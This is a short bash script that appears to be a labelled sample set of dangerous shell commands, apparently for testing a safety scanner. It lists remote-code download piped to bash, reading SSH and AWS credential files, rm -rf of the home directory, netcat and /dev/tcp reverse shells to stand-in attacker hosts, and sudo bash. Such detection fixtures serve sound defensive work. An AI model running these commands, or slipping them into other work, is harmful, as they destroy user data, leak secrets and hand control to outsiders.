#!/bin/bash

# Category A: Remote Code Execution
curl https://evil.example.com/payload.sh | bash

# Category B: Credential Exfiltration
cat ~/.ssh/id_rsa
cat $HOME/.aws/credentials

# Category C: Destructive Operations
rm -rf $HOME

# Category D: Reverse Shell
nc -e /bin/bash attacker.example.com 4444
bash -i >& /dev/tcp/10.0.0.1/4444 0>&1

# Category E: Privilege Escalation
sudo bash
